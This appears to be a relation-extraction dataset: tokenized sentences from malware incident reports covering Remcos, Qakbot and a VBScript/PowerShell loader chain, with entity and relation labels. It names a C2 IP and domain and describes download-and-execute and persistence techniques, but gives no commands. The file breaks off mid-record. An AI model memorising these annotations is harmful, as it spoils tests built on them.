[{"title": "018-0", "sents": [["In", "one", "engagement", "affecting", "a", "U.S.", "medical", "facility", ",", "CTIR", "identified", "a", "malicious", "Microsoft", "Excel", "file", "(", "XLS", ")", "disseminated", "via", "phishing", "emails", "delivering", "a", "variant", "of", "the", "Remcos", "Remote", "Access", "Trojan", "(", "RAT", ")", "."], ["CTIR", "identified", "remote", "network", "connections", "using", "a", "systems", "administrator", "account", "just", "prior", "to", "the", "suspected", "timeframe", "."], ["The", "aforementioned", "XLS", "contains", "Visual", "Basic", "code", "which", "will", "execute", "once", "a", "user", "opens", "the", "file", "and", "enables", "macros", "."], ["The", "CTIR", "team", "has", "identified", "the", "IP", "address", ",", "209.127.19.101", ",", "found", "in", "a", "PowerShell", "command", "in", "which", "the", "next", "phases", "of", "the", "infection", "were", "downloaded", "from", "URLs", "that", "are", "hosted", "on", "that", "IP", "."], ["Email", "addresses", "have", "been", "removed", "from", "the", "original", "message", ",", "probably", "to", "eliminate", "sensitive", "data", ".", "The", "reason", "for", "this", "redaction", ",", "however", ",", "is", "not", "yet", "determined", "."], ["While", "investigating", "the", "affected", "system", ",", "once", "the", "user", "clicked", "on", "the", "malicious", "link", ",", "a", "ZIP", "file", "was", "downloaded", "to", "the", "following", "directory", ",", "``", "C", ":", "/Users/", "<", "user", ">", "/Downloads", "''", "."], ["The", "ZIP", "contained", "a", "Windows", "shortcut", "(", "LNK", ")", "file", "where", "the", "contents", "included", "a", "command", "intended", "to", "create", "a", "directory", "under", "the", "user", "profile", "and", "attempt", "to", "contact", "a", "Command", "and", "Control", "(", "C2", ")", "domain", "(", "bottlenuts.com", ")", "to", "retrieve", "and", "execute", "a", "file", "using", "the", "Windows", "utility", "``", "regsvr32.exe", "''", "."], ["Despite", "the", "user", "not", "executing", "the", "Qakbot", "payload", ",", "the", "command", "line", "arguments", "and", "C2", "domain", "are", "consistent", "with", "the", "recent", "Qakbot", "campaign", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "XLS", "pos": [17, 18], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [33, 33], "name": "RAT", "pos": [33, 34], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "XLS", "pos": [2, 3], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [65, 65], "name": "user", "pos": [12, 13], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [82, 82], "name": "209.127.19.101", "pos": [9, 10], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [87, 87], "name": "PowerShell", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [153, 153], "name": "ZIP", "pos": [16, 17], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "ZIP", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [179, 179], "name": "LNK", "pos": [7, 8], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [187, 187], "name": "command", "pos": [15, 16], "index": "9_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [195, 195], "name": "user profile", "pos": [23, 25], "index": "10_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [210, 210], "name": "bottlenuts.com", "pos": [38, 39], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [217, 217], "name": "file", "pos": [45, 46], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [223, 223], "name": "regsvr32.exe", "pos": [51, 52], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [240, 240], "name": "C2 domain", "pos": [14, 16], "index": "14_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 1, "t": 7}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "RD", "evidence": [2], "t": 2, "h": 3}, {"r": "ST", "evidence": [3], "t": 4, "h": 5}, {"r": "RF", "evidence": [3], "t": 4, "h": 5}, {"r": "WR", "evidence": [3, 4, 5], "h": 5, "t": 6}, {"r": "FR", "evidence": [3, 4, 5, 6], "h": 5, "t": 7}, {"r": "EX", "evidence": [5, 6], "t": 6, "h": 7}, {"r": "FR", "evidence": [6], "t": 9, "h": 13}, {"r": "RD", "evidence": [6], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "h": 9, "t": 10}, {"r": "ST", "evidence": [6], "h": 9, "t": 11}, {"r": "FR", "evidence": [6], "h": 7, "t": 13}, {"r": "RD", "evidence": [6], "h": 9, "t": 10}, {"r": "EX", "evidence": [6], "t": 12, "h": 13}, {"r": "CO", "evidence": [6], "h": 8, "t": 12}]}, {"title": "018-1", "sents": [["CTIR", "identified", "remote", "network", "connections", "using", "a", "systems", "administrator", "account", "just", "prior", "to", "the", "suspected", "timeframe", "."], ["The", "aforementioned", "XLS", "contains", "Visual", "Basic", "code", "which", "will", "execute", "once", "a", "user", "opens", "the", "file", "and", "enables", "macros", "."], ["The", "CTIR", "team", "has", "identified", "the", "IP", "address", ",", "209.127.19.101", ",", "found", "in", "a", "PowerShell", "command", "in", "which", "the", "next", "phases", "of", "the", "infection", "were", "downloaded", "from", "URLs", "that", "are", "hosted", "on", "that", "IP", "."], ["Email", "addresses", "have", "been", "removed", "from", "the", "original", "message", ",", "probably", "to", "eliminate", "sensitive", "data", ".", "The", "reason", "for", "this", "redaction", ",", "however", ",", "is", "not", "yet", "determined", "."], ["While", "investigating", "the", "affected", "system", ",", "once", "the", "user", "clicked", "on", "the", "malicious", "link", ",", "a", "ZIP", "file", "was", "downloaded", "to", "the", "following", "directory", ",", "``", "C", ":", "/Users/", "<", "user", ">", "/Downloads", "''", "."], ["The", "ZIP", "contained", "a", "Windows", "shortcut", "(", "LNK", ")", "file", "where", "the", "contents", "included", "a", "command", "intended", "to", "create", "a", "directory", "under", "the", "user", "profile", "and", "attempt", "to", "contact", "a", "Command", "and", "Control", "(", "C2", ")", "domain", "(", "bottlenuts.com", ")", "to", "retrieve", "and", "execute", "a", "file", "using", "the", "Windows", "utility", "``", "regsvr32.exe", "''", "."], ["Despite", "the", "user", "not", "executing", "the", "Qakbot", "payload", ",", "the", "command", "line", "arguments", "and", "C2", "domain", "are", "consistent", "with", "the", "recent", "Qakbot", "campaign", "."], ["In", "this", "case", ",", "CTIR", "could", "not", "determine", "the", "initial", "access", "vector", "due", "to", "a", "lack", "of", "logging", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "XLS", "pos": [2, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "user", "pos": [12, 13], "index": "1_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [46, 46], "name": "209.127.19.101", "pos": [9, 10], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [51, 51], "name": "PowerShell", "pos": [14, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "ZIP", "pos": [16, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [137, 137], "name": "ZIP", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "LNK", "pos": [7, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [151, 151], "name": "command", "pos": [15, 16], "index": "7_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [159, 159], "name": "user profile", "pos": [23, 25], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [174, 174], "name": "bottlenuts.com", "pos": [38, 39], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [181, 181], "name": "file", "pos": [45, 46], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [187, 187], "name": "regsvr32.exe", "pos": [51, 52], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [204, 204], "name": "C2 domain", "pos": [14, 16], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [1], "t": 0, "h": 1}, {"r": "ST", "evidence": [2], "t": 2, "h": 3}, {"r": "RF", "evidence": [2], "t": 2, "h": 3}, {"r": "WR", "evidence": [2, 3, 4], "h": 3, "t": 4}, {"r": "FR", "evidence": [2, 3, 4, 5], "h": 3, "t": 5}, {"r": "EX", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "FR", "evidence": [5], "t": 7, "h": 11}, {"r": "RD", "evidence": [5], "h": 7, "t": 8}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "ST", "evidence": [5], "h": 7, "t": 9}, {"r": "FR", "evidence": [5], "h": 5, "t": 11}, {"r": "RD", "evidence": [5], "h": 7, "t": 8}, {"r": "EX", "evidence": [5], "t": 10, "h": 11}, {"r": "CO", "evidence": [5], "h": 6, "t": 10}]}, {"title": "023-0", "sents": [["The", "infection", "process", "begins", "with", "an", "ISO", "containing", "a", "malicious", "VBScript", "."], ["When", "executed", ",", "the", "script", "initiates", "a", "multi-stage", "infection", "process", "."], ["To", "obfuscate", "the", "executed", "code", ",", "the", "VBS", "contains", "junk", "data", "and", "uses", "string", "replacement", "."], ["Once", "deobfuscated", ",", "it", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "via", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "."], ["The", "first", "step", "of", "the", "script", "checks", "whether", "a", "directory", "exists", "at", "a", "specific", "location", ";"], ["if", "it", "does", "n't", "exist", ",", "the", "script", "creates", "it", "."], ["It", "then", "creates", "several", "additional", "scripts", ",", "and", "content", "is", "written", "into", "each", "of", "them", "in", "a", "similar", "format", "."], ["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "infection process", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "VBScript", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "script", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [30, 30], "name": "VBS", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [42, 42], "name": "it", "pos": [3, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [51, 51], "name": "attacker-controlled server", "pos": [12, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [54, 54], "name": "PowerShell script", "pos": [15, 17], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [59, 59], "name": "Invoke-Expression ( IEX ) cmdlet", "pos": [20, 25], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [70, 70], "name": "script", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [82, 82], "name": "it", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [92, 92], "name": "It", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [97, 97], "name": "scripts", "pos": [5, 6], "index": "11_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 9}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 10}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "ST", "evidence": [3], "h": 4, "t": 5}, {"r": "RF", "evidence": [3], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 4, "t": 7}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 7}, {"r": "EX", "evidence": [3], "t": 6, "h": 7}, {"r": "RD", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "EX", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}]}, {"title": "023-1", "sents": [["When", "executed", ",", "the", "script", "initiates", "a", "multi-stage", "infection", "process", "."], ["To", "obfuscate", "the", "executed", "code", ",", "the", "VBS", "contains", "junk", "data", "and", "uses", "string", "replacement", "."], ["Once", "deobfuscated", ",", "it", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "via", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "."], ["The", "first", "step", "of", "the", "script", "checks", "whether", "a", "directory", "exists", "at", "a", "specific", "location", ";"], ["if", "it", "does", "n't", "exist", ",", "the", "script", "creates", "it", "."], ["It", "then", "creates", "several", "additional", "scripts", ",", "and", "content", "is", "written", "into", "each", "of", "them", "in", "a", "similar", "format", "."], ["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "script", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "VBS", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [30, 30], "name": "it", "pos": [3, 4], "index": "2_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [39, 39], "name": "attacker-controlled server", "pos": [12, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "PowerShell script", "pos": [15, 17], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [47, 47], "name": "Invoke-Expression ( IEX ) cmdlet", "pos": [20, 25], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "script", "pos": [5, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "it", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [80, 80], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [85, 85], "name": "scripts", "pos": [5, 6], "index": "9_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [117, 117], "name": "PowerShell", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [119, 119], "name": "'Office . vbs", "pos": [7, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [130, 130], "name": "infection process", "pos": [18, 20], "index": "12_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "ST", "evidence": [2], "h": 2, "t": 3}, {"r": "RF", "evidence": [2], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 2, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 5}, {"r": "EX", "evidence": [2], "t": 4, "h": 5}, {"r": "RD", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "EX", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 11}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "t": 6, "h": 10}, {"r": "FR", "evidence": [7], "h": 10, "t": 12}, {"r": "EX", "evidence": [7], "t": 11, "h": 12}]}, {"title": "023-2", "sents": [["To", "obfuscate", "the", "executed", "code", ",", "the", "VBS", "contains", "junk", "data", "and", "uses", "string", "replacement", "."], ["Once", "deobfuscated", ",", "it", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "via", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "."], ["The", "first", "step", "of", "the", "script", "checks", "whether", "a", "directory", "exists", "at", "a", "specific", "location", ";"], ["if", "it", "does", "n't", "exist", ",", "the", "script", "creates", "it", "."], ["It", "then", "creates", "several", "additional", "scripts", ",", "and", "content", "is", "written", "into", "each", "of", "them", "in", "a", "similar", "format", "."], ["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["Following", "this", ",", "the", "first", "script", ",", "``", "Office", ".", "vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", ",", "which", "invokes", "WScript", "to", "execute", "a", "batch", "file", "named", "``", "Office.bat", "''", "to", "further", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "VBS", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "it", "pos": [3, 4], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [28, 28], "name": "attacker-controlled server", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "PowerShell script", "pos": [15, 17], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [36, 36], "name": "Invoke-Expression ( IEX ) cmdlet", "pos": [20, 25], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "script", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "it", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [69, 69], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [74, 74], "name": "scripts", "pos": [5, 6], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [106, 106], "name": "PowerShell", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [108, 108], "name": "'Office . vbs", "pos": [7, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [119, 119], "name": "infection process", "pos": [18, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": "Office . vbs", "pos": [8, 11], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [141, 141], "name": "PowerShell", "pos": [19, 20], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [145, 145], "name": "WScript", "pos": [23, 24], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [153, 153], "name": "Office.bat", "pos": [31, 32], "index": "15_0"}]], "labels": [{"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 1, "t": 4}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 4}, {"r": "EX", "evidence": [1], "t": 3, "h": 4}, {"r": "RD", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "EX", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 8, "t": 12}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "t": 5, "h": 9}, {"r": "FR", "evidence": [6], "h": 9, "t": 11}, {"r": "EX", "evidence": [6], "t": 10, "h": 11}, {"r": "CO", "evidence": [6, 7], "h": 9, "t": 13}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}, {"r": "EX", "evidence": [7], "h": 14, "t": 15}]}, {"title": "023-3", "sents": [["Once", "deobfuscated", ",", "it", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "via", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "."], ["The", "first", "step", "of", "the", "script", "checks", "whether", "a", "directory", "exists", "at", "a", "specific", "location", ";"], ["if", "it", "does", "n't", "exist", ",", "the", "script", "creates", "it", "."], ["It", "then", "creates", "several", "additional", "scripts", ",", "and", "content", "is", "written", "into", "each", "of", "them", "in", "a", "similar", "format", "."], ["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["Following", "this", ",", "the", "first", "script", ",", "``", "Office", ".", "vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", ",", "which", "invokes", "WScript", "to", "execute", "a", "batch", "file", "named", "``", "Office.bat", "''", "to", "further", "the", "infection", "process", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "it", "pos": [3, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "attacker-controlled server", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "PowerShell script", "pos": [15, 17], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [20, 20], "name": "Invoke-Expression ( IEX ) cmdlet", "pos": [20, 25], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "script", "pos": [5, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "it", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [53, 53], "name": "It", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "scripts", "pos": [5, 6], "index": "7_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [90, 90], "name": "PowerShell", "pos": [5, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [92, 92], "name": "'Office . vbs", "pos": [7, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "infection process", "pos": [18, 20], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [114, 114], "name": "Office . vbs", "pos": [8, 11], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [125, 125], "name": "PowerShell", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [129, 129], "name": "WScript", "pos": [23, 24], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [137, 137], "name": "Office.bat", "pos": [31, 32], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [154, 154], "name": "PowerShell script", "pos": [9, 11], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [157, 157], "name": "'Office.ps1", "pos": [12, 13], "index": "16_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "RD", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "EX", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4, 5], "h": 7, "t": 9}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 7, "t": 11}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "t": 4, "h": 8}, {"r": "FR", "evidence": [5], "h": 8, "t": 10}, {"r": "EX", "evidence": [5], "t": 9, "h": 10}, {"r": "CO", "evidence": [5, 6], "h": 8, "t": 12}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "EX", "evidence": [6], "h": 13, "t": 14}, {"r": "CO", "evidence": [7], "h": 15, "t": 16}]}, {"title": "023-4", "sents": [["The", "first", "step", "of", "the", "script", "checks", "whether", "a", "directory", "exists", "at", "a", "specific", "location", ";"], ["if", "it", "does", "n't", "exist", ",", "the", "script", "creates", "it", "."], ["It", "then", "creates", "several", "additional", "scripts", ",", "and", "content", "is", "written", "into", "each", "of", "them", "in", "a", "similar", "format", "."], ["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["Following", "this", ",", "the", "first", "script", ",", "``", "Office", ".", "vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", ",", "which", "invokes", "WScript", "to", "execute", "a", "batch", "file", "named", "``", "Office.bat", "''", "to", "further", "the", "infection", "process", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "script", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "it", "pos": [1, 2], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [27, 27], "name": "It", "pos": [0, 1], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [32, 32], "name": "scripts", "pos": [5, 6], "index": "3_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [64, 64], "name": "PowerShell", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [66, 66], "name": "'Office . vbs", "pos": [7, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [77, 77], "name": "infection process", "pos": [18, 20], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "Office . vbs", "pos": [8, 11], "index": "7_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [99, 99], "name": "PowerShell", "pos": [19, 20], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "WScript", "pos": [23, 24], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [111, 111], "name": "Office.bat", "pos": [31, 32], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [128, 128], "name": "PowerShell script", "pos": [9, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [131, 131], "name": "'Office.ps1", "pos": [12, 13], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [136, 136], "name": "PowerShell", "pos": [2, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [150, 150], "name": "Office", "pos": [16, 17], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3, 4], "h": 3, "t": 5}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 3, "t": 7}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "t": 0, "h": 4}, {"r": "FR", "evidence": [4], "h": 4, "t": 6}, {"r": "EX", "evidence": [4], "t": 5, "h": 6}, {"r": "CO", "evidence": [4, 5], "h": 4, "t": 8}, {"r": "FR", "evidence": [5], "h": 8, "t": 9}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [6], "h": 11, "t": 12}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}]}, {"title": "023-5", "sents": [["if", "it", "does", "n't", "exist", ",", "the", "script", "creates", "it", "."], ["It", "then", "creates", "several", "additional", "scripts", ",", "and", "content", "is", "written", "into", "each", "of", "them", "in", "a", "similar", "format", "."], ["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["Following", "this", ",", "the", "first", "script", ",", "``", "Office", ".", "vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", ",", "which", "invokes", "WScript", "to", "execute", "a", "batch", "file", "named", "``", "Office.bat", "''", "to", "further", "the", "infection", "process", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", "."], ["As", "part", "of", "the", "creation", "process", ",", "this", "scheduled", "task", "executes", "``", "Microsofd.vbs", ",", "''", "which", "initiates", "a", "short", "sleep", "before", "continuing", "to", "execute", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "it", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [11, 11], "name": "It", "pos": [0, 1], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "scripts", "pos": [5, 6], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [48, 48], "name": "PowerShell", 